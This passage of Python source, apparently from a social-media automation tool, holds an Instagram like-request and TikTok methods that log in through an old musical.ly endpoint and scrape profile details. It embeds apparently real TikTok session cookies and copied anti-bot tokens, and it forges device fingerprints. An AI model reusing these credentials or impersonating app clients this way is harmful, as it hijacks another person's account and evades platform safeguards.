            'x-asbd-id': '198387',
            'x-csrftoken': str(gdo_drow.csrf_token()['csrf_token']),
            'x-ig-app-id': '936619743392459',
            'x-ig-www-claim': 'hmac.AR1uQ-iX4kPv3S7OgVlHqdoy-l9MiEpOXeiyxpZdbvWKxKgA',
            'x-instagram-ajax': '20e2a5e214f4',
            'x-requested-with': 'XMLHttpRequest', }
        res = requests.post(url, headers=headers).text
        if ('status: "ok"') in res:
            return {'status': 'Success', 'like': 'true'}

        else:
            return {'status': 'error', 'like': 'false'}


class info_tiktok:

    def get_sessionid(username: str, password: str) -> str:
        url = 'https://api2.musical.ly/passport/user/login/?mix_mode=1&username=1&email=&mobile=&account=&password=hg&captcha=&ts=&app_type=normal&app_language=en&manifest_version_code=2018073102&_rticket=1633593458298&iid=7011916372695598854&channel=googleplay&language=en&fp=&device_type=SM-G955F&resolution=1440*2792&openudid=91cac57ba8ef12b6&update_version_code=2018073102&sys_region=AS&os_api=28&is_my_cn=0&timezone_name=Asia/Muscat&dpi=560&carrier_region=OM&ac=wifi&device_id=6785177577851504133&mcc_mnc=42203&timezone_offset=14400&os_version=9&version_code=800&carrier_region_v2=422&app_name=musical_ly&version_name=8.0.0&device_brand=samsung&ssmix=a&build_number=8.0.0&device_platform=android&region=US&aid=&as=&cp=Qm&mas='
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
            'cookie': 'csrftoken=' + str(secrets.token_hex(8) * 2) + '; sessionid=' + str(
                secrets.token_hex(8) * 2) + ';',
            'User-Agent': 'Connectionzucom.zhiliaoapp.musically/2018073102 (Linux; U; Android 9; en_AS; SM-G955F; Build/PPR1.180610.011; Cronet/58.0.2991.0)z',
            'Host': 'api2.musical.ly', 'Connection': 'keep-alive'}
        data = {"email": str(username), "password": str(password)}
        res = requests.post(url, headers=headers, data=data)
        if ("user_id") in res.text:
            sessionid = str(res.json()['data']['session_key'])
            message = {
                'status': 'Succese',
                'sessionid': str(sessionid)}
            return message

        elif ("Incorrect account or password") in res.text:
            return {'status': 'error.username_or_password'}
        else:
            return {'status': 'error'}

    def name(user: str) -> str:
        url = 'https://m.tiktok.com/api/user/detail/?aid=1988&app_name=tiktok_web&device_platform=web_mobile&device_id=7074866456449713670&region=IQ&priority_region=IQ&os=android&referer=&cookie_enabled=true&screen_width=393&screen_height=873&browser_language=ar-EG&browser_platform=Linux+aarch64&browser_name=Mozilla&browser_version=5.0+(Linux;+Android+11;+M2103K19G)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/99.0.4844.66+Mobile+Safari/537.36&browser_online=true&verifyFp=verify_l0wf3oa3_tprFK83t_Q0pW_4EH0_BU4w_42nV9RgFBTIH&app_language=ar&timezone_name=Asia/Baghdad&is_page_visible=true&focus_state=true&is_fullscreen=false&history_len=2&battery_info={}&uniqueId=' + user + '&msToken=4M1DZ-8b03tXs9pqv4iVHGoa9RXRgOB11HjiL7cvs8Sit3X4JTzxsy1FUbmomfk1U3kiown_BdR8lyO_nyxhL6EgNXwVolAz4Qg50PD5imlyx5VhnUkEAeOvU6Gs4ejKs2ODHR8=&X-Bogus=DFSzswSOxhhANtVzSRkg-KW5ZE/N&_signature=_02B4Z6wo0000142Tr2wAAIDC54h1kUWPxv-Nk6vAAIFYd8'
        headers = {
            'User-Agent': str(gdo_drow.get_user_agent()),
            'Accept': 'application/json, text/plain, */*',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'Content-Type': 'application/json',
            'Cookie': 'passport_csrf_token=458c72cf0594545b4d8e79bf3caded25; passport_csrf_token_default=458c72cf0594545b4d8e79bf3caded25; passport_auth_status=251fd84db2fafd555a135e73908379b5,; passport_auth_status_ss=251fd84db2fafd555a135e73908379b5,; sid_guard=9eac4270bbe6804badac8696654b064e|1648687327|5184000|Mon,+30-May-2022+00:42:07+GMT; uid_tt=6d8a5958360a534b628ae820fa7a2bdd67e9902f9494fceebe98cd9950759557; uid_tt_ss=6d8a5958360a534b628ae820fa7a2bdd67e9902f9494fceebe98cd9950759557; sid_tt=9eac4270bbe6804badac8696654b064e; sessionid=9eac4270bbe6804badac8696654b064e; sessionid_ss=9eac4270bbe6804badac8696654b064e; sid_ucp_v1=1.0.0-KDQ4MDZkODM4NzQ0MDE1YzNlYjlkOGJjYWMxZDhlYTk3OTY4MWUzYTEKHwiBiLn0lpPUrWEQ3_GTkgYYswsgDDCfpu2KBjgIQBIQAxoGbWFsaXZhIiA5ZWFjNDI3MGJiZTY4MDRiYWRhYzg2OTY2NTRiMDY0ZQ; ssid_ucp_v1=1.0.0-KDQ4MDZkODM4NzQ0MDE1YzNlYjlkOGJjYWMxZDhlYTk3OTY4MWUzYTEKHwiBiLn0lpPUrWEQ3_GTkgYYswsgDDCfpu2KBjgIQBIQAxoGbWFsaXZhIiA5ZWFjNDI3MGJiZTY4MDRiYWRhYzg2OTY2NTRiMDY0ZQ; store-idc=alisg; store-country-code=iq; tt-target-idc=alisg; tt_csrf_token=TOzZoC0p-lXaXuL7lq6ynvJywC006F8ixc-A; _abck=093D884478C406B48D6E8F4696FBC348~-1~YAAQBLR7XL8RDiOAAQAABiCpMgf/mTykvtzUPdMKxO5b9PAf4oFOTanUbEbor2OmIngPpyC6Gzf66YjbaUUGpIPpBJ6ZwPhpCdVw4jctEx+wSCOttDZjMU65rD6zxWbtErf36ZnocPLoCiwN5pagDq/K3e/s5O4bpPtO5xf8le7+yGLPsEHjMwGneEj6YSGYSE9QauyY6FvziUVCTSNQiuEUC8Soy+kufKxVEpwwzN5Zo1KV1q1rw4rtClwvCDo4CEi8icykPZfjta2PKf2zax/B4euHxWX5mzFP7HmPFsmBK8UQvmAM++ZUF7AY52kH1Polr7cB9ziWZAuRcLRO4UIKu35+cMb4xjJH3bAWXZXX5DaFoi55crdz3h9RBRzmCDTB5LPPiIN/RDA=~-1~-1~-1; ak_bmsc=3B8069AEE7E00870B984D180ECFFBD5D~000000000000000000000000000000~YAAQBLR7XMARDiOAAQAABiCpMg9auExniSBpZbCVcLzVPFqefIbpGImTcAxDH2gABB5UwaA2MVjucEhh3S7gz30SLbwpNUNrz1kgII1USn5iNT3nlqfwkJVlcGM/1WSVAAT4ZgMH9JJsS//Ev2hNH0Ux3RbCPvS+5d88mwT/lNKfrvgYT1zmm+1gb21gQNNIgnt3RSvR26eNTW80k36v2qJi1mLyiQVZYD3rRi94vlyWRGASfWooBznWg99OujqaSU2DXh2EuyupYmhBBkiOFvQFkvapmgdgfcIRy9HQJROh4YzV3aFuxOWpi+5a0DxdYE5kuh4dcEjOL7RDIukoWWNvcjLhX2ViXpIsA2NyFLbWTPq5nQFOArd4a+KagglgXyHAIX41UAg=; bm_sz=C6365C417EF2307C8B0C15C7E15B62F5~YAAQBLR7XMERDiOAAQAABiCpMg8IGWK7o/apYJdjwsv1/wjLItPslFiabm8NbHoZlZ73XiI+aRFhHtVd+ptrlGm0b5jJM63YDiGi+4Rb/IXFoZMyZmtm2If31jRMKd0p8jcPat/qubsjnRKFdRKSBqnJymUgVOb/A6SlOBhOfAqCXRJ0AvRBWce3f55YpiqDr50KCJS77E5dDyowvlOcXIbULbqO5MbYMj93Nl8DptG025NLLhevbIltxsVtU9Mr0OTE1ewY8MNOwZFKRM+0lZ1fvuQUJBFNTlqHwa6hbs3BXkc=~3552578~4408887; odin_tt=27b8d72a704b3dd1b987f6309bb1afbde567eb6d8f4108cc0c01daf7b00cc85a6461560b71a5592eb54b6776088e5a22971675b58ccfc9405aea62e1bf507156cec903e457da0accc7dbf02dfdef9cb7; ttwid=1|Y3Nv6hZ_tt-KrXdOWRCHJUZNBnvJt9gACwthXSzp5uY|1650117421|a5d1e6984719ca946c7088a118f5c09ca9468056b9430fd38b2ef693aaeb1eee; cmpl_token=AgQQAPOnF-RMpbFlvj7mvJ04-F-i-0ZR_4csYMA9cQ; bm_mi=7444CFE66808C67F62BCEBB880BD4DB7~UHV9BJZPF2NZr3P4g421EuBTucUNYIexr523/VwvKCGfGzEAfA1abHo8HYcKocxP+laN76JpUglyrLWY/Gkgc2BxZA4J3kAdwnBbz96YgaPRpe2m9+BRU2xTO6kc/ycqlm+3zUicVNfb+BftRwhtikPp+l3bSk4GNtW1kKVJI3DTB2YzhM9BMwiYMTvpxW9tSed75nLNZDJuCY/wP2hwfbmR0+UrKlZggDnPvsfpv8k=; msToken=1gt3-BZ_WjAoOKJxJh77qZAJR0tGKOAx_iKHEG75TaFCWXltux0CfvXETy1S5uFizHuw9DcSWYsip8dnS1EpGdK7gG_7XVOBSU_F7yzjFdB6V9UyhBONnTMqvHgGsO9wY4IXWO0=; bm_sv=EC714A2F6623FDD508362A22220189F7~uPx5OKNtLIB/jt8DLjlHUsoWWA2xFWVI1T6e4HQN01YlW2sITk6VB9L8uvYfK6KWeeNGzPqsa+fnnxgvUnSNA5aYfYIDBepRuxD1J8oSmfnY8CDJOt+09fr3PnZLd+cAvxrBKSE1nAEhvdeNGnN0fTu4h4erxMOH27501pU0E8g=',
            'Origin': 'https://www.tiktok.com',
            'Referer': 'https://www.tiktok.com/'}
        data = {'uniqueld': str(user)}
        try:
            res = requests.get(url, headers=headers, data=data).content
            info = json.loads(res)
            name = info['userInfo']['user']['nickname']
            return {'name': str(name)}
        except:
            return False

    def id(user: str) -> str:
        url = 'https://m.tiktok.com/api/user/detail/?aid=1988&app_name=tiktok_web&device_platform=web_mobile&device_id=7074866456449713670&region=IQ&priority_region=IQ&os=android&referer=&cookie_enabled=true&screen_width=393&screen_height=873&browser_language=ar-EG&browser_platform=Linux+aarch64&browser_name=Mozilla&browser_version=5.0+(Linux;+Android+11;+M2103K19G)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/99.0.4844.66+Mobile+Safari/537.36&browser_online=true&verifyFp=verify_l0wf3oa3_tprFK83t_Q0pW_4EH0_BU4w_42nV9RgFBTIH&app_language=ar&timezone_name=Asia/Baghdad&is_page_visible=true&focus_state=true&is_fullscreen=false&history_len=2&battery_info={}&uniqueId=' + user + '&msToken=4M1DZ-8b03tXs9pqv4iVHGoa9RXRgOB11HjiL7cvs8Sit3X4JTzxsy1FUbmomfk1U3kiown_BdR8lyO_nyxhL6EgNXwVolAz4Qg50PD5imlyx5VhnUkEAeOvU6Gs4ejKs2ODHR8=&X-Bogus=DFSzswSOxhhANtVzSRkg-KW5ZE/N&_signature=_02B4Z6wo0000142Tr2wAAIDC54h1kUWPxv-Nk6vAAIFYd8'
        headers = {
            'User-Agent': str(gdo_drow.get_user_agent()),
            'Accept': 'application/json, text/plain, */*',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'Content-Type': 'application/json',
            'Cookie': 'passport_csrf_token=458c72cf0594545b4d8e79bf3caded25; passport_csrf_token_default=458c72cf0594545b4d8e79bf3caded25; passport_auth_status=251fd84db2fafd555a135e73908379b5,; passport_auth_status_ss=251fd84db2fafd555a135e73908379b5,; sid_guard=9eac4270bbe6804badac8696654b064e|1648687327|5184000|Mon,+30-May-2022+00:42:07+GMT; uid_tt=6d8a5958360a534b628ae820fa7a2bdd67e9902f9494fceebe98cd9950759557; uid_tt_ss=6d8a5958360a534b628ae820fa7a2bdd67e9902f9494fceebe98cd9950759557; sid_tt=9eac4270bbe6804badac8696654b064e; sessionid=9eac4270bbe6804badac8696654b064e; sessionid_ss=9eac4270bbe6804badac8696654b064e; sid_ucp_v1=1.0.0-KDQ4MDZkODM4NzQ0MDE1YzNlYjlkOGJjYWMxZDhlYTk3OTY4MWUzYTEKHwiBiLn0lpPUrWEQ3_GTkgYYswsgDDCfpu2KBjgIQBIQAxoGbWFsaXZhIiA5ZWFjNDI3MGJiZTY4MDRiYWRhYzg2OTY2NTRiMDY0ZQ; ssid_ucp_v1=1.0.0-KDQ4MDZkODM4NzQ0MDE1YzNlYjlkOGJjYWMxZDhlYTk3OTY4MWUzYTEKHwiBiLn0lpPUrWEQ3_GTkgYYswsgDDCfpu2KBjgIQBIQAxoGbWFsaXZhIiA5ZWFjNDI3MGJiZTY4MDRiYWRhYzg2OTY2NTRiMDY0ZQ; store-idc=alisg; store-country-code=iq; tt-target-idc=alisg; tt_csrf_token=TOzZoC0p-lXaXuL7lq6ynvJywC006F8ixc-A; _abck=093D884478C406B48D6E8F4696FBC348~-1~YAAQBLR7XL8RDiOAAQAABiCpMgf/mTykvtzUPdMKxO5b9PAf4oFOTanUbEbor2OmIngPpyC6Gzf66YjbaUUGpIPpBJ6ZwPhpCdVw4jctEx+wSCOttDZjMU65rD6zxWbtErf36ZnocPLoCiwN5pagDq/K3e/s5O4bpPtO5xf8le7+yGLPsEHjMwGneEj6YSGYSE9QauyY6FvziUVCTSNQiuEUC8Soy+kufKxVEpwwzN5Zo1KV1q1rw4rtClwvCDo4CEi8icykPZfjta2PKf2zax/B4euHxWX5mzFP7HmPFsmBK8UQvmAM++ZUF7AY52kH1Polr7cB9ziWZAuRcLRO4UIKu35+cMb4xjJH3bAWXZXX5DaFoi55crdz3h9RBRzmCDTB5LPPiIN/RDA=~-1~-1~-1; ak_bmsc=3B8069AEE7E00870B984D180ECFFBD5D~000000000000000000000000000000~YAAQBLR7XMARDiOAAQAABiCpMg9auExniSBpZbCVcLzVPFqefIbpGImTcAxDH2gABB5UwaA2MVjucEhh3S7gz30SLbwpNUNrz1kgII1USn5iNT3nlqfwkJVlcGM/1WSVAAT4ZgMH9JJsS//Ev2hNH0Ux3RbCPvS+5d88mwT/lNKfrvgYT1zmm+1gb21gQNNIgnt3RSvR26eNTW80k36v2qJi1mLyiQVZYD3rRi94vlyWRGASfWooBznWg99OujqaSU2DXh2EuyupYmhBBkiOFvQFkvapmgdgfcIRy9HQJROh4YzV3aFuxOWpi+5a0DxdYE5kuh4dcEjOL7RDIukoWWNvcjLhX2ViXpIsA2NyFLbWTPq5nQFOArd4a+KagglgXyHAIX41UAg=; bm_sz=C6365C417EF2307C8B0C15C7E15B62F5~YAAQBLR7XMERDiOAAQAABiCpMg8IGWK7o/apYJdjwsv1/wjLItPslFiabm8NbHoZlZ73XiI+aRFhHtVd+ptrlGm0b5jJM63YDiGi+4Rb/IXFoZMyZmtm2If31jRMKd0p8jcPat/qubsjnRKFdRKSBqnJymUgVOb/A6SlOBhOfAqCXRJ0AvRBWce3f55YpiqDr50KCJS77E5dDyowvlOcXIbULbqO5MbYMj93Nl8DptG025NLLhevbIltxsVtU9Mr0OTE1ewY8MNOwZFKRM+0lZ1fvuQUJBFNTlqHwa6hbs3BXkc=~3552578~4408887; odin_tt=27b8d72a704b3dd1b987f6309bb1afbde567eb6d8f4108cc0c01daf7b00cc85a6461560b71a5592eb54b6776088e5a22971675b58ccfc9405aea62e1bf507156cec903e457da0accc7dbf02dfdef9cb7; ttwid=1|Y3Nv6hZ_tt-KrXdOWRCHJUZNBnvJt9gACwthXSzp5uY|1650117421|a5d1e6984719ca946c7088a118f5c09ca9468056b9430fd38b2ef693aaeb1eee; cmpl_token=AgQQAPOnF-RMpbFlvj7mvJ04-F-i-0ZR_4csYMA9cQ; bm_mi=7444CFE66808C67F62BCEBB880BD4DB7~UHV9BJZPF2NZr3P4g421EuBTucUNYIexr523/VwvKCGfGzEAfA1abHo8HYcKocxP+laN76JpUglyrLWY/Gkgc2BxZA4J3kAdwnBbz96YgaPRpe2m9+BRU2xTO6kc/ycqlm+3zUicVNfb+BftRwhtikPp+l3bSk4GNtW1kKVJI3DTB2YzhM9BMwiYMTvpxW9tSed75nLNZDJuCY/wP2hwfbmR0+UrKlZggDnPvsfpv8k=; msToken=1gt3-BZ_WjAoOKJxJh77qZAJR0tGKOAx_iKHEG75TaFCWXltux0CfvXETy1S5uFizHuw9DcSWYsip8dnS1EpGdK7gG_7XVOBSU_F7yzjFdB6V9UyhBONnTMqvHgGsO9wY4IXWO0=; bm_sv=EC714A2F6623FDD508362A22220189F7~uPx5OKNtLIB/jt8DLjlHUsoWWA2xFWVI1T6e4HQN01YlW2sITk6VB9L8uvYfK6KWeeNGzPqsa+fnnxgvUnSNA5aYfYIDBepRuxD1J8oSmfnY8CDJOt+09fr3PnZLd+cAvxrBKSE1nAEhvdeNGnN0fTu4h4erxMOH27501pU0E8g=',
            'Origin': 'https://www.tiktok.com',
            'Referer': 'https://www.tiktok.com/'}
        data = {'uniqueld': str(user)}
        try:
            res = requests.get(url, headers=headers, data=data).content
            info = json.loads(res)
            id = info['userInfo']['user']['id']
            return {'id': str(id)}
        except:
            return False

    def followers(user: str) -> str:
        url = 'https://m.tiktok.com/api/user/detail/?aid=1988&app_name=tiktok_web&device_platform=web_mobile&device_id=7074866456449713670&region=IQ&priority_region=IQ&os=android&referer=&cookie_enabled=true&screen_width=393&screen_height=873&browser_language=ar-EG&browser_platform=Linux+aarch64&browser_name=Mozilla&browser_version=5.0+(Linux;+Android+11;+M2103K19G)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/99.0.4844.66+Mobile+Safari/537.36&browser_online=true&verifyFp=verify_l0wf3oa3_tprFK83t_Q0pW_4EH0_BU4w_42nV9RgFBTIH&app_language=ar&timezone_name=Asia/Baghdad&is_page_visible=true&focus_state=true&is_fullscreen=false&history_len=2&battery_info={}&uniqueId=' + str(
            user) + '&msToken=4M1DZ-8b03tXs9pqv4iVHGoa9RXRgOB11HjiL7cvs8Sit3X4JTzxsy1FUbmomfk1U3kiown_BdR8lyO_nyxhL6EgNXwVolAz4Qg50PD5imlyx5VhnUkEAeOvU6Gs4ejKs2ODHR8=&X-Bogus=DFSzswSOxhhANtVzSRkg-KW5ZE/N&_signature=_02B4Z6wo0000142Tr2wAAIDC54h1kUWPxv-Nk6vAAIFYd8'
        headers = {
            'User-Agent': str(gdo_drow.get_user_agent()),
            'Accept': 'application/json, text/plain, */*',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'Content-Type': 'application/json',
            'Cookie': 'passport_csrf_token=458c72cf0594545b4d8e79bf3caded25; passport_csrf_token_default=458c72cf0594545b4d8e79bf3caded25; passport_auth_status=251fd84db2fafd555a135e73908379b5,; passport_auth_status_ss=251fd84db2fafd555a135e73908379b5,; sid_guard=9eac4270bbe6804badac8696654b064e|1648687327|5184000|Mon,+30-May-2022+00:42:07+GMT; uid_tt=6d8a5958360a534b628ae820fa7a2bdd67e9902f9494fceebe98cd9950759557; uid_tt_ss=6d8a5958360a534b628ae820fa7a2bdd67e9902f9494fceebe98cd9950759557; sid_tt=9eac4270bbe6804badac8696654b064e; sessionid=9eac4270bbe6804badac8696654b064e; sessionid_ss=9eac4270bbe6804badac8696654b064e; sid_ucp_v1=1.0.0-KDQ4MDZkODM4NzQ0MDE1YzNlYjlkOGJjYWMxZDhlYTk3OTY4MWUzYTEKHwiBiLn0lpPUrWEQ3_GTkgYYswsgDDCfpu2KBjgIQBIQAxoGbWFsaXZhIiA5ZWFjNDI3MGJiZTY4MDRiYWRhYzg2OTY2NTRiMDY0ZQ; ssid_ucp_v1=1.0.0-KDQ4MDZkODM4NzQ0MDE1YzNlYjlkOGJjYWMxZDhlYTk3OTY4MWUzYTEKHwiBiLn0lpPUrWEQ3_GTkgYYswsgDDCfpu2KBjgIQBIQAxoGbWFsaXZhIiA5ZWFjNDI3MGJiZTY4MDRiYWRhYzg2OTY2NTRiMDY0ZQ; store-idc=alisg; store-country-code=iq; tt-target-idc=alisg; tt_csrf_token=TOzZoC0p-lXaXuL7lq6ynvJywC006F8ixc-A; _abck=093D884478C406B48D6E8F4696FBC348~-1~YAAQBLR7XL8RDiOAAQAABiCpMgf/mTykvtzUPdMKxO5b9PAf4oFOTanUbEbor2OmIngPpyC6Gzf66YjbaUUGpIPpBJ6ZwPhpCdVw4jctEx+wSCOttDZjMU65rD6zxWbtErf36ZnocPLoCiwN5pagDq/K3e/s5O4bpPtO5xf8le7+yGLPsEHjMwGneEj6YSGYSE9QauyY6FvziUVCTSNQiuEUC8Soy+kufKxVEpwwzN5Zo1KV1q1rw4rtClwvCDo4CEi8icykPZfjta2PKf2zax/B4euHxWX5mzFP7HmPFsmBK8UQvmAM++ZUF7AY52kH1Polr7cB9ziWZAuRcLRO4UIKu35+cMb4xjJH3bAWXZXX5DaFoi55crdz3h9RBRzmCDTB5LPPiIN/RDA=~-1~-1~-1; ak_bmsc=3B8069AEE7E00870B984D180ECFFBD5D~000000000000000000000000000000~YAAQBLR7XMARDiOAAQAABiCpMg9auExniSBpZbCVcLzVPFqefIbpGImTcAxDH2gABB5UwaA2MVjucEhh3S7gz30SLbwpNUNrz1kgII1USn5iNT3nlqfwkJVlcGM/1WSVAAT4ZgMH9JJsS//Ev2hNH0Ux3RbCPvS+5d88mwT/lNKfrvgYT1zmm+1gb21gQNNIgnt3RSvR26eNTW80k36v2qJi1mLyiQVZYD3rRi94vlyWRGASfWooBznWg99OujqaSU2DXh2EuyupYmhBBkiOFvQFkvapmgdgfcIRy9HQJROh4YzV3aFuxOWpi+5a0DxdYE5kuh4dcEjOL7RDIukoWWNvcjLhX2ViXpIsA2NyFLbWTPq5nQFOArd4a+KagglgXyHAIX41UAg=; bm_sz=C6365C417EF2307C8B0C15C7E15B62F5~YAAQBLR7XMERDiOAAQAABiCpMg8IGWK7o/apYJdjwsv1/wjLItPslFiabm8NbHoZlZ73XiI+aRFhHtVd+ptrlGm0b5jJM63YDiGi+4Rb/IXFoZMyZmtm2If31jRMKd0p8jcPat/qubsjnRKFdRKSBqnJymUgVOb/A6SlOBhOfAqCXRJ0AvRBWce3f55YpiqDr50KCJS77E5dDyowvlOcXIbULbqO5MbYMj93Nl8DptG025NLLhevbIltxsVtU9Mr0OTE1ewY8MNOwZFKRM+0lZ1fvuQUJBFNTlqHwa6hbs3BXkc=~3552578~4408887; odin_tt=27b8d72a704b3dd1b987f6309bb1afbde567eb6d8f4108cc0c01daf7b00cc85a6461560b71a5592eb54b6776088e5a22971675b58ccfc9405aea62e1bf507156cec903e457da0accc7dbf02dfdef9cb7; ttwid=1|Y3Nv6hZ_tt-KrXdOWRCHJUZNBnvJt9gACwthXSzp5uY|1650117421|a5d1e6984719ca946c7088a118f5c09ca9468056b9430fd38b2ef693aaeb1eee; cmpl_token=AgQQAPOnF-RMpbFlvj7mvJ04-F-i-0ZR_4csYMA9cQ; bm_mi=7444CFE66808C67F62BCEBB880BD4DB7~UHV9BJZPF2NZr3P4g421EuBTucUNYIexr523/VwvKCGfGzEAfA1abHo8HYcKocxP+laN76JpUglyrLWY/Gkgc2BxZA4J3kAdwnBbz96YgaPRpe2m9+BRU2xTO6kc/ycqlm+3zUicVNfb+BftRwhtikPp+l3bSk4GNtW1kKVJI3DTB2YzhM9BMwiYMTvpxW9tSed75nLNZDJuCY/wP2hwfbmR0+UrKlZggDnPvsfpv8k=; msToken=1gt3-BZ_WjAoOKJxJh77qZAJR0tGKOAx_iKHEG75TaFCWXltux0CfvXETy1S5uFizHuw9DcSWYsip8dnS1EpGdK7gG_7XVOBSU_F7yzjFdB6V9UyhBONnTMqvHgGsO9wY4IXWO0=; bm_sv=EC714A2F6623FDD508362A22220189F7~uPx5OKNtLIB/jt8DLjlHUsoWWA2xFWVI1T6e4HQN01YlW2sITk6VB9L8uvYfK6KWeeNGzPqsa+fnnxgvUnSNA5aYfYIDBepRuxD1J8oSmfnY8CDJOt+09fr3PnZLd+cAvxrBKSE1nAEhvdeNGnN0fTu4h4erxMOH27501pU0E8g=',
            'Origin': 'https://www.tiktok.com',
            'Referer': 'https://www.tiktok.com/'}
        data = {'uniqueld': str(user)}
        try:
            res = requests.get(url, headers=headers, data=data).content
            info = json.loads(res)
            followers = info['userInfo']['stats']['followerCount']
            return {'followers': str(followers)}
        except:
            return False

    def following(user: str) -> str:
        url = 'https://m.tiktok.com/api/user/detail/?aid=1988&app_name=tiktok_web&device_platform=web_mobile&device_id=7074866456449713670&region=IQ&priority_region=IQ&os=android&referer=&cookie_enabled=true&screen_width=393&screen_height=873&browser_language=ar-EG&browser_platform=Linux+aarch64&browser_name=Mozilla&browser_version=5.0+(Linux;+Android+11;+M2103K19G)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/99.0.4844.66+Mobile+Safari/537.36&browser_online=true&verifyFp=verify_l0wf3oa3_tprFK83t_Q0pW_4EH0_BU4w_42nV9RgFBTIH&app_language=ar&timezone_name=Asia/Baghdad&is_page_visible=true&focus_state=true&is_fullscreen=false&history_len=2&battery_info={}&uniqueId=' + str(
            user) + '&msToken=4M1DZ-8b03tXs9pqv4iVHGoa9RXRgOB11HjiL7cvs8Sit3X4JTzxsy1FUbmomfk1U3kiown_BdR8lyO_nyxhL6EgNXwVolAz4Qg50PD5imlyx5VhnUkEAeOvU6Gs4ejKs2ODHR8=&X-Bogus=DFSzswSOxhhANtVzSRkg-KW5ZE/N&_signature=_02B4Z6wo0000142Tr2wAAIDC54h1kUWPxv-Nk6vAAIFYd8'
        headers = {
            'User-Agent': str(gdo_drow.get_user_agent()),
            'Accept': 'application/json, text/plain, */*',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'Content-Type': 'application/json',
            'Cookie': 'passport_csrf_token=458c72cf0594545b4d8e79bf3caded25; passport_csrf_token_default=458c72cf0594545b4d8e79bf3caded25; passport_auth_status=251fd84db2fafd555a135e73908379b5,; passport_auth_status_ss=251fd84db2fafd555a135e73908379b5,; sid_guard=9eac4270bbe6804badac8696654b064e|1648687327|5184000|Mon,+30-May-2022+00:42:07+GMT; uid_tt=6d8a5958360a534b628ae820fa7a2bdd67e9902f9494fceebe98cd9950759557; uid_tt_ss=6d8a5958360a534b628ae820fa7a2bdd67e9902f9494fceebe98cd9950759557; sid_tt=9eac4270bbe6804badac8696654b064e; sessionid=9eac4270bbe6804badac8696654b064e; sessionid_ss=9eac4270bbe6804badac8696654b064e; sid_ucp_v1=1.0.0-KDQ4MDZkODM4NzQ0MDE1YzNlYjlkOGJjYWMxZDhlYTk3OTY4MWUzYTEKHwiBiLn0lpPUrWEQ3_GTkgYYswsgDDCfpu2KBjgIQBIQAxoGbWFsaXZhIiA5ZWFjNDI3MGJiZTY4MDRiYWRhYzg2OTY2NTRiMDY0ZQ; ssid_ucp_v1=1.0.0-KDQ4MDZkODM4NzQ0MDE1YzNlYjlkOGJjYWMxZDhlYTk3OTY4MWUzYTEKHwiBiLn0lpPUrWEQ3_GTkgYYswsgDDCfpu2KBjgIQBIQAxoGbWFsaXZhIiA5ZWFjNDI3MGJiZTY4MDRiYWRhYzg2OTY2NTRiMDY0ZQ; store-idc=alisg; store-country-code=iq; tt-target-idc=alisg; tt_csrf_token=TOzZoC0p-lXaXuL7lq6ynvJywC006F8ixc-A; _abck=093D884478C406B48D6E8F4696FBC348~-1~YAAQBLR7XL8RDiOAAQAABiCpMgf/mTykvtzUPdMKxO5b9PAf4oFOTanUbEbor2OmIngPpyC6Gzf66YjbaUUGpIPpBJ6ZwPhpCdVw4jctEx+wSCOttDZjMU65rD6zxWbtErf36ZnocPLoCiwN5pagDq/K3e/s5O4bpPtO5xf8le7+yGLPsEHjMwGneEj6YSGYSE9QauyY6FvziUVCTSNQiuEUC8Soy+kufKxVEpwwzN5Zo1KV1q1rw4rtClwvCDo4CEi8icykPZfjta2PKf2zax/B4euHxWX5mzFP7HmPFsmBK8UQvmAM++ZUF7AY52kH1Polr7cB9ziWZAuRcLRO4UIKu35+cMb4xjJH3bAWXZXX5DaFoi55crdz3h9RBRzmCDTB5LPPiIN/RDA=~-1~-1~-1; ak_bmsc=3B8069AEE7E00870B984D180ECFFBD5D~000000000000000000000000000000~YAAQBLR7XMARDiOAAQAABiCpMg9auExniSBpZbCVcLzVPFqefIbpGImTcAxDH2gABB5UwaA2MVjucEhh3S7gz30SLbwpNUNrz1kgII1USn5iNT3nlqfwkJVlcGM/1WSVAAT4ZgMH9JJsS//Ev2hNH0Ux3RbCPvS+5d88mwT/lNKfrvgYT1zmm+1gb21gQNNIgnt3RSvR26eNTW80k36v2qJi1mLyiQVZYD3rRi94vlyWRGASfWooBznWg99OujqaSU2DXh2EuyupYmhBBkiOFvQFkvapmgdgfcIRy9HQJROh4YzV3aFuxOWpi+5a0DxdYE5kuh4dcEjOL7RDIukoWWNvcjLhX2ViXpIsA2NyFLbWTPq5nQFOArd4a+KagglgXyHAIX41UAg=; bm_sz=C6365C417EF2307C8B0C15C7E15B62F5~YAAQBLR7XMERDiOAAQAABiCpMg8IGWK7o/apYJdjwsv1/wjLItPslFiabm8NbHoZlZ73XiI+aRFhHtVd+ptrlGm0b5jJM63YDiGi+4Rb/IXFoZMyZmtm2If31jRMKd0p8jcPat/qubsjnRKFdRKSBqnJymUgVOb/A6SlOBhOfAqCXRJ0AvRBWce3f55YpiqDr50KCJS77E5dDyowvlOcXIbULbqO5MbYMj93Nl8DptG025NLLhevbIltxsVtU9Mr0OTE1ewY8MNOwZFKRM+0lZ1fvuQUJBFNTlqHwa6hbs3BXkc=~3552578~4408887; odin_tt=27b8d72a704b3dd1b987f6309bb1afbde567eb6d8f4108cc0c01daf7b00cc85a6461560b71a5592eb54b6776088e5a22971675b58ccfc9405aea62e1bf507156cec903e457da0accc7dbf02dfdef9cb7; ttwid=1|Y3Nv6hZ_tt-KrXdOWRCHJUZNBnvJt9gACwthXSzp5uY|1650117421|a5d1e6984719ca946c7088a118f5c09ca9468056b9430fd38b2ef693aaeb1eee; 